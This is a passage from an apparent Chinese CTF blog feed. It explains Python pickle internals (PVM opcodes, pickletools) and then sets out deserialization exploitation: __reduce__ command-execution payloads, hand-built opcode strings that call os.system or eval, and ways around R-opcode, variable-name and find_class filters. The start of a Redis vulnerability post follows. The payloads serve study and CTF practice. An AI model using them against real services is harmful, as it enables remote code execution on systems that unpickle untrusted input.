&#123;<span class="hljs-string">&quot;current_location&quot;</span>: q&#125;<br>a = pickle.dumps(data)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.pkl&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(a)<br>file = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.pkl&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br>r = requests.post(url=url, files=file)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="pvm"><a class="markdownIt-Anchor" href="#pvm"></a> PVM</h3><p>我们在使用pickler的时候，我们要序列化的内容，必须经过PVM，Pickle Virtual Machine (PVM)是Python语言中的一个虚拟机，用于序列化和反序列化Python对象。它是Python标准库中的一部分，由Python的pickle模块提供支持。下面是Pickle Virtual Machine的运行原理：</p><ol><li>生成操作码序列：pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值。这些操作码将被保存到文件或网络流中，以便在反序列化时使用。</li><li>反序列化操作码：在反序列化时，pickle模块读取操作码序列，并将其解释为Python对象。它通过Pickle Virtual Machine来执行操作码序列。Virtual Machine会按顺序读取操作码，并根据操作码的类型执行相应的操作。</li><li>执行操作码：Pickle Virtual Machine支持多种操作码，包括压入常量、调用函数、设置属性等。执行操作码的过程中，Virtual Machine会维护一个栈来存储数据。当执行操作码时，它会将数据从栈中取出，并根据操作码的类型进行相应的操作。执行完成后，结果将被压入栈中。</li><li>构造Python对象：当操作码序列被完全执行后，Pickle Virtual Machine会将栈顶的数据作为结果返回。这个结果就是反序列化后的Python对象。</li></ol><h4 id="组成"><a class="markdownIt-Anchor" href="#组成"></a> 组成</h4><p>指令处理器、栈区和内存区。</p><ol><li>指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到<code>.</code>这个结束符<code>.</code>后停止。最终留在栈顶的值将被作为反序列化对象返回。</li><li>栈区：用 list 实现的，被用来临时存储数据、参数以及对象。</li><li>内存区：用 dict 实现的，为 PVM 的整个生命周期提供存储。</li></ol><p>注意：</p><p>​(1)操作码是单字节的<br />​(2)带参数的指令用换行符定界</p><h4 id="协议"><a class="markdownIt-Anchor" href="#协议"></a> 协议</h4><p>PVN总共有6种协议：v0-v5</p><p>从序列化的字节可以判断出是哪种协议，v2-v5的字节都是<code>\x80\x0版本号</code>的形式</p><p>而v0-v1则都是以<code>ccopy_reg\n_reconstructor\n</code>开头</p><h4 id="opcode操作码"><a class="markdownIt-Anchor" href="#opcode操作码"></a> opcode(操作码)</h4><table><thead><tr><th>指令</th><th>描述</th><th>具体写法</th><th>栈上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td><td>获得的对象入栈</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h3 id="pickletools"><a class="markdownIt-Anchor" href="#pickletools"></a> pickletools</h3><p>pickle规定了pickletools便于人工解读opcode</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pickletools.dis(pickle, <span class="hljs-attribute">out</span>=None, <span class="hljs-attribute">memo</span>=None, <span class="hljs-attribute">indentlevel</span>=4, <span class="hljs-attribute">annotate</span>=0)#将 pickle 的符号化反汇编数据输出到文件类对象<br>pickletools.genops(pickle) #提供包含 pickle 中所有操作码的 iterator，返回一个 (opcode, arg, pos) 三元组的序列<br>pickletools.optimize(picklestring) #在消除未使用的 `PUT` 操作码之后返回一个新的等效 pickle 字符串。<br></code></pre></td></tr></table></figure><h3 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法"></a> 魔术方法</h3><h4 id="__reduce__"><a class="markdownIt-Anchor" href="#__reduce__"></a> <code>__reduce__()</code></h4><p>对应opcode:<code>R</code></p><p>通过重写<code>__reduce__()</code>使得序列化时按照重写的方式进行。</p><p><code>__reduce__()</code>定义的函数需要返回一个字符串或者元组，但返回元组<code>(callable, ([para1,para2...])[,...])</code>时，进行反序列化会调用<code>callable(para,...)</code></p><p>程序有<code>import os</code>时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        command=<span class="hljs-string">r&quot;whoami&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system,(command,)) <span class="hljs-comment">#第一个参数是命令，第二个参数是元组作为命令的参数</span><br> <br>p=EXP()<br>opcode=pickle.dumps(p)<br><span class="hljs-built_in">print</span>(opcode)<br></code></pre></td></tr></table></figure><p>程序没有<code>import os</code>时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        command=<span class="hljs-string">r&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(command,)) <span class="hljs-comment">#第一个参数是命令，第二个参数是元组作为命令的参数</span><br> <br>p=EXP()<br>opcode=pickle.dumps(p)<br>opcode=base64.b64encode(opcode)<br><span class="hljs-built_in">print</span>(opcode)<br><br></code></pre></td></tr></table></figure><h4 id="__repr__"><a class="markdownIt-Anchor" href="#__repr__"></a> <code>__repr__()</code></h4><p>通过重写该函数，<strong>打印</strong>实例化对象时会输出<code>__repr__</code>返回的内容，前提是没有写<code>__str__</code>，否则会调用成<code>__str__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CLanguage</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name = <span class="hljs-string">&quot;C语言中文网&quot;</span><br>        self.add = <span class="hljs-string">&quot;http://c.biancheng.net&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CLanguage[name=&quot;</span>+ self.name +<span class="hljs-string">&quot;,add=&quot;</span> + self.add +<span class="hljs-string">&quot;]&quot;</span><br>clangs = CLanguage()<br><span class="hljs-built_in">print</span>(clangs)<br><span class="hljs-comment">#CLanguage[name=C语言中文网,add=http://c.biancheng.net]</span><br></code></pre></td></tr></table></figure><h4 id="__eq__"><a class="markdownIt-Anchor" href="#__eq__"></a> <code>__eq__()</code></h4><p>当进行两个类比较时会自动调用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">result == <span class="hljs-built_in">people</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.name</span>, <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.sex</span>, <span class="hljs-selector-tag">b</span>.age)<br></code></pre></td></tr></table></figure><h4 id="__setstate__"><a class="markdownIt-Anchor" href="#__setstate__"></a> <code>__setstate__()</code></h4><p>反序列化时调用<code>__setstate__</code></p><h4 id="__getstate__"><a class="markdownIt-Anchor" href="#__getstate__"></a> <code>__getstate__()</code></h4><p>被序列化时调用<code>__getstate__</code></p><p>必须返回一个字典</p><h2 id="pickle反序列化漏洞利用思路"><a class="markdownIt-Anchor" href="#pickle反序列化漏洞利用思路"></a> pickle反序列化漏洞利用思路</h2><h3 id="全局变量覆盖"><a class="markdownIt-Anchor" href="#全局变量覆盖"></a> 全局变量覆盖</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#secret.py</span><br><span class="hljs-string">secret=&quot;ikun&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret变量的值为:&quot;</span>+secret.secret)<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;secret&#x27;</span><br><span class="hljs-string">S&#x27;microblacker&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br>hack=pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret变量的值为:&quot;</span>+secret.secret)<br><br><span class="hljs-comment">#secret变量的值为:ikun</span><br><span class="hljs-comment">#secret变量的值为:microblacker</span><br></code></pre></td></tr></table></figure><h3 id="全局变量引入"><a class="markdownIt-Anchor" href="#全局变量引入"></a> 全局变量引入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#secret.py</span><br>pwd=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">secret</span>:<br>    pwd = <span class="hljs-string">&quot;microblacker&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.pwd = secret.pwd<br><br>test = Test()<br><br>payload1=<span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTest\nc__builtin__\nobject\nNtR(dVpwd\nVmicroblacker\nsb.&#x27;</span><br>p=pickle.loads(payload1)<br><span class="hljs-built_in">print</span>(p.pwd) <span class="hljs-comment">#microblacker</span><br><span class="hljs-comment">#取消secret注释</span><br>payload2=<span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVpwd\np6\nI123\nsb.&#x27;</span><br>p=pickle.loads(payload2)<br><span class="hljs-built_in">print</span>(p.pwd) <span class="hljs-comment">#123</span><br></code></pre></td></tr></table></figure><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Test<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dVpwd<span class="hljs-symbol">\n</span>Vmicroblacker<span class="hljs-symbol">\n</span>sb.&#x27;<br>这句通过s指令形成键值&#123;&#x27;pwd&#x27;:&#x27;microblacker&#x27;&#125;<br>b&#x27;ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Test<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dVpwd<span class="hljs-symbol">\n</span>csecret<span class="hljs-symbol">\n</span>pwd<span class="hljs-symbol">\n</span>sb.&#x27;<br>这句则通过s指令形成键值&#123;&#x27;pwd&#x27;:&#x27;secret.pwd&#x27;&#125; 并且是全局变量<br></code></pre></td></tr></table></figure><h3 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h3><p>通过在类中重写<code>__reduce__</code>方法，从而在反序列化时执行任意命令，但是通过这种方法一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式。可以依靠四个指令来完成：<code>R</code>,<code>i</code>,<code>o</code>,<code>b</code></p><h4 id="r"><a class="markdownIt-Anchor" href="#r"></a> <code>R</code></h4><p>选择栈上的第一个对象作为函数、第二个对象作为参数，然后调用该函数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">opcode</span>=b<span class="hljs-string">&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="i"><a class="markdownIt-Anchor" href="#i"></a> <code>i</code></h4><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">opcode</span>=b<span class="hljs-string">&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="o"><a class="markdownIt-Anchor" href="#o"></a> <code>o</code></h4><p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">opcode</span>=b<span class="hljs-string">&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="b-__setstate__"><a class="markdownIt-Anchor" href="#b-__setstate__"></a> <code>b +__setstate__()</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.animal=<span class="hljs-string">&quot;dog&quot;</span><br>a=<span class="hljs-string">b&#x27;\x80\x03c__main__\nanimal\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.&#x27;</span><br>b=pickle.loads(a)<br></code></pre></td></tr></table></figure><h3 id="过滤绕过"><a class="markdownIt-Anchor" href="#过滤绕过"></a> 过滤绕过</h3><h4 id="过滤r"><a class="markdownIt-Anchor" href="#过滤r"></a> 过滤<code>R</code></h4><p>利用其他指令绕过</p><h4 id="过滤变量名"><a class="markdownIt-Anchor" href="#过滤变量名"></a> 过滤变量名</h4><p>双exec绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;exec(&#x27;admin.se&#x27;+&#x27;cret=&quot;admin&quot;&#x27;)&#x27;</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">exec</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="绕过unpicklerfind_class"><a class="markdownIt-Anchor" href="#绕过unpicklerfind_class"></a> 绕过Unpickler.find_class()</h4><p>只用<code>c</code>对builtin进行操作来构造payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">opcode=b<span class="hljs-string">&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0                    #取到内置函数 getattr()，用于获取对象的属性。</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;</span><span class="hljs-keyword">get</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp1                  #取到builtins.dict</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)Rp2                  # getattr(dict, &#x27;</span><span class="hljs-keyword">get</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">00g1</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;</span>__builtins__<span class="hljs-string">&#x27;       # get(__import__(&#x27;</span>builtins<span class="hljs-string">&#x27;).globals(), &#x27;</span>__builtins__<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g0                       #getattr(__builtins__, &#x27;</span>eval<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;</span>eval<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tR(S&#x27;</span>__import__(&quot;os&quot;).<span class="hljs-keyword">system</span>(&quot;calc&quot;)<span class="hljs-string">&#x27;    # 取到 eval 然后实现 RCE</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">opcode=b&#x27;&#x27;<span class="hljs-emphasis">&#x27;cbuiltins</span><br><span class="hljs-emphasis">getattr</span><br><span class="hljs-emphasis">p0</span><br><span class="hljs-emphasis">(cbuiltins</span><br><span class="hljs-emphasis">dict</span><br><span class="hljs-emphasis">S&#x27;</span>get&#x27;<br>tRp1<br>cbuiltins<br>globals<br>)Rp2<br>00g1<br>(g2<br>S&#x27;<span class="hljs-emphasis">__builtins__</span>&#x27;<br>tRp3<br>0g0<br>(g3<br>S&#x27;eval&#x27;<br>tR(S&#x27;<span class="hljs-emphasis">__import__</span>(&quot;os&quot;).system(&quot;calc&quot;)&#x27;<br>tR.<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>绕过R，使用o</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;\x80\x03(cbuiltins<span class="hljs-symbol">\n</span>getattr<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>cbuiltins<span class="hljs-symbol">\n</span>dict<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>X\x03\x00\x00\x00getop2<span class="hljs-symbol">\n</span>0(g2<span class="hljs-symbol">\n</span>(cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>oX\x0C\x00\x00\x00__builtins__op3<span class="hljs-symbol">\n</span>(g0<span class="hljs-symbol">\n</span>g3<span class="hljs-symbol">\n</span>X\x04\x00\x00\x00evalop4<span class="hljs-symbol">\n</span>(g4<span class="hljs-symbol">\n</span>X\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;calc&quot;)o00.&#x27;<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><h4 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h4><p><code>S'flag' </code>可以替换为<code>S'\x66\x6c\x61\x67'</code>或者<code>V'\u0066\u006C\u0061\u0067'</code></p><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h2><p><em><a href="https://tttang.com/archive/1885/">https://tttang.com/archive/1885/</a></em></p><p><em><a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></em></p><p><em><a href="https://forum.butian.net/share/1929">https://forum.butian.net/share/1929</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis漏洞</title>
    <link href="/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是redis"><a class="markdownIt-Anchor" href="#什么是redis"></a> 什么是Redis</h3><p>Redis（Remote Dictionary Server）是一个开源的内存数据存储系统，它可以用作数据库、缓存和消息中间件。Redis是一个键值存储数据库，其中每个键都映射到一个值，这些值可以是字符串、哈希、列表、集合、有序集合等数据类型。默认运行端口<strong>6379</strong></p><p>存储特性</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>.以内存作为数据存储介质，读写数据的效率极高。<br><span class="hljs-number">2</span>.储存在 Redis中的数据是持久化的，断电或重启，数据也不会丢失<br><span class="hljs-number">3</span>.存储分为内存存储、磁盘存储和<span class="hljs-built_in">log</span>文件。<br><span class="hljs-number">4</span>.可以从磁盘重新将数据加载到內存中，也可以通过配置文件对其进行配置，因此，redis才能实现持久化<br><span class="hljs-number">5</span>.支持主从模式，可以配置集群，更利于支撑大型的项目。<br></code></pre></td></tr></table></figure><h3 id="kali安装redis"><a class="markdownIt-Anchor" href="#kali安装redis"></a> Kali安装Redis</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxvf redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.tar.gz<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>/ <br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">make</span> test<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>/src<br><span class="hljs-attribute">cp</span> redis-cli redis-server /usr/bin/<br><span class="hljs-attribute">cp</span> redis.conf /etc<br><span class="hljs-attribute">redis</span>-server #启动服务端<br><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">6379</span> #客户端连接<br><span class="hljs-attribute">config</span> set slave-read-only no <br><span class="hljs-attribute">ps</span> -aux | grep redis  #查看redis启动状态<br></code></pre></td></tr></table></figure><h3 id="redis常用命令"><a class="markdownIt-Anchor" href="#redis常用命令"></a> Redis常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 